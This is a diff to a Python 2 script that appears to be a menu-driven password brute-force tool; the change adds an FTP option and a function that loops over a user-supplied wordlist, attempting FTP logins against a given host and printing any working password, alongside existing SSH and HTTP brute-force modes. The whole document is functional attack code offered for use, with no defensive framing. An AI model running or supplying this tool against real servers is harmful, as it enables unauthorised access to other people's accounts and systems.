@@ -3,6 +3,7 @@ import paramiko
 import sys
 import getopt
 from termcolor import colored 
+from ftplib import FTP
 
 def main():
     print colored("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n","blue")
@@ -11,11 +12,14 @@ def main():
     print colored("%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n\n","blue")
     print colored("[1]for ssh brute force\n","blue")
     print colored("[2]for http brue force\n","blue")
+    print colored("[3]for ftp brue force\n","blue")
     choice=input("enter your choice:\n")
     if choice==1:
         ssh_brute()
     elif choice==2:
         http_brute()
+    elif choice==3:
+        ftp_brute()
     else:
         print("Invalid choice")
         
@@ -42,6 +46,7 @@ def ssh_brute():
             print(e)
             found=False
             cred=""
+            
         if cred!="":
             print colored("Found: ","green"),colored(cred,"green")
             break
@@ -85,6 +90,33 @@ def http_brute():
         print colored("No password found","red")
     file.close() 
             
+def ftp_brute():
+    u=raw_input("enter username\n")
+    p=raw_input("enter the password file\n")
+    h=raw_input("enter the host ip\n")
+    words=list()
+    file=open(p,"rb")
+    found=False
+    cred=""
+    for i in file.readlines():
+        strn=str(i.rstrip())
+        words.append(strn)
+    for word in words:
+        try:
+            print "trying ",u," with ",word
+            ftp=FTP(h)
+            ftp.login(u,word)
+            cred=word
+            found=True
+        except Exception as e:
+            found=False
+        if cred!="":
+            print colored("found","green"),colored(cred,"green")
+            break
         
+    if not found:
+        print("No cred found")
+            
+    
         
 main()
